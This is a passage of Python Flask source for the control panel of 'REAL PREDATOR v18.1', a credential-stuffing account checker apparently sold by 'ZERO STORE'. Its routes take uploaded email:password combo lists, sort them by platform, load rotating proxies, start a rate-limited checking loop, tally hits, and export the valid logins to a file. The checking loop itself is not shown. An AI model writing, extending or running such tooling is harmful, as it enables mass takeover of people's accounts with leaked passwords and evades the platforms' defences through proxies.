    if 'authenticated' not in session or not session['authenticated']:
        return jsonify({'error': 'unauthorized'}), 401
    return jsonify({'success': True, 'feed': state.feed[:100]})

@app.route('/api/results')
def get_results():
    if 'authenticated' not in session or not session['authenticated']:
        return jsonify({'error': 'unauthorized'}), 401
    return jsonify({'success': True, 'results': state.results[:200]})

@app.route('/api/start', methods=['POST'])
def start_predator():
    if 'authenticated' not in session or not session['authenticated']:
        return jsonify({'error': 'unauthorized'}), 401
    if state.running:
        return jsonify({'success': False, 'error': 'Already running'})
    data = request.json or {}
    speed = int(data.get('speed', 30))
    platform = data.get('platform')
    auto_mode = data.get('auto_mode', False)
    
    state.speed = min(max(speed, 5), 60)
    state.selected_platform = platform
    state.auto_mode = auto_mode
    
    with state.lock:
        state.running = True
        state.start_time = time.time()
        state.checked = 0
        state.total = len(state.combo_list) if state.combo_list else 0
        state.hits = 0
        state.bad = 0
        state.errors = 0
        state.gaming = 0
        state.generated = 0
        state.feed = []
        state.results = []
    
    mode = 'AUTO' if auto_mode else f'PLATFORM: {platform}'
    add_feed('info', f'🔥 STARTED | {state.speed} RPM | {mode}')
    
    thread = threading.Thread(target=predator_loop, daemon=True)
    thread.start()
    return jsonify({'success': True})

@app.route('/api/stop', methods=['POST'])
def stop_predator():
    if 'authenticated' not in session or not session['authenticated']:
        return jsonify({'error': 'unauthorized'}), 401
    state.running = False
    add_feed('info', '🛑 STOPPED')
    return jsonify({'success': True})

@app.route('/api/clear', methods=['POST'])
def clear_data():
    if 'authenticated' not in session or not session['authenticated']:
        return jsonify({'error': 'unauthorized'}), 401
    with state.lock:
        state.results = []
        state.feed = []
        state.checked = 0
        state.hits = 0
        state.bad = 0
        state.errors = 0
        state.gaming = 0
    return jsonify({'success': True})

@app.route('/api/upload/combo', methods=['POST'])
def upload_combo():
    if 'authenticated' not in session or not session['authenticated']:
        return jsonify({'error': 'unauthorized'}), 401
    data = request.json
    content = data.get('content', '')
    lines = [l.strip() for l in content.split('\n') if ':' in l.strip()]
    state.combo_list = []
    platform_stats = {}
    
    for line in lines:
        parts = line.split(':', 1)
        if len(parts) == 2:
            email = parts[0].strip()
            password = parts[1].strip()
            detected = detect_platform(email)
            if detected:
                state.combo_list.append((email, password, detected))
                platform_stats[detected] = platform_stats.get(detected, 0) + 1
            else:
                state.combo_list.append((email, password, None))
    
    state.total = len(state.combo_list)
    add_feed('info', f'📤 Uploaded {len(state.combo_list)}')
    return jsonify({'success': True, 'count': len(state.combo_list), 'stats': platform_stats})

@app.route('/api/upload/proxy', methods=['POST'])
def upload_proxy():
    if 'authenticated' not in session or not session['authenticated']:
        return jsonify({'error': 'unauthorized'}), 401
    data = request.json
    content = data.get('content', '')
    proxies = [p.strip() for p in content.split('\n') if p.strip()]
    state.proxies = proxies
    add_feed('info', f'🌐 تم تحميل {len(proxies)} بروكسي وتفعيلها فوراً')
    return jsonify({'success': True, 'count': len(proxies)})

@app.route('/api/export', methods=['POST'])
def export_results():
    if 'authenticated' not in session or not session['authenticated']:
        return jsonify({'error': 'unauthorized'}), 401
    if not state.results:
        return jsonify({'success': False, 'error': 'No results'})
    filename = f"real_predator_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
    with open(filename, 'w', encoding='utf-8') as f:
        f.write(f"REAL PREDATOR\nDate: {datetime.now()}\nTotal: {len(state.results)}\n\n")
        for item in state.results:
            f.write(item['content'] + '\n\n')
    return jsonify({'success': True, 'filename': filename})

@app.route('/api/download/<filename>')
def download_file(filename):
    if 'authenticated' not in session or not session['authenticated']:
        return jsonify({'error': 'unauthorized'}), 401
    if os.path.exists(filename):
        return send_file(filename, as_attachment=True)
    return jsonify({'error': 'Not found'}), 404

@app.route('/api/cleanup', methods=['POST'])
def cleanup_keys():
    if 'authenticated' not in session or not session['authenticated']:
        return jsonify({'error': 'unauthorized'}), 401
    conn = sqlite3.connect('bot_control.db')
    c = conn.cursor()
    deleted = c.execute('DELETE FROM bot_keys WHERE expires_at < ?', (datetime.now().isoformat(),))
    count = deleted.rowcount
    conn.commit()
    conn.close()
    return jsonify({'success': True, 'count': count})

@app.route('/api/platforms')
def get_platforms():
    if 'authenticated' not in session or not session['authenticated']:
        return jsonify({'error': 'unauthorized'}), 401
    return jsonify({'platforms': PLATFORMS})

# ================================================================
# التشغيل
# ================================================================
if __name__ == '__main__':
    bot_thread = threading.Thread(target=bot_listener_loop, daemon=True)
    bot_thread.start()
    
    port = int(os.environ.get('PORT', 7070))
    print("""
╔══════════════════════════════════════════╗
║   REAL PREDATOR v18.1                   ║
║   Developer: ZERO STORE                ║
║   Telegram: @MRDPY                     ║
╚══════════════════════════════════════════╝
    """)
    app.run(host='0.0.0.0', port=port, debug=False, threaded=True)
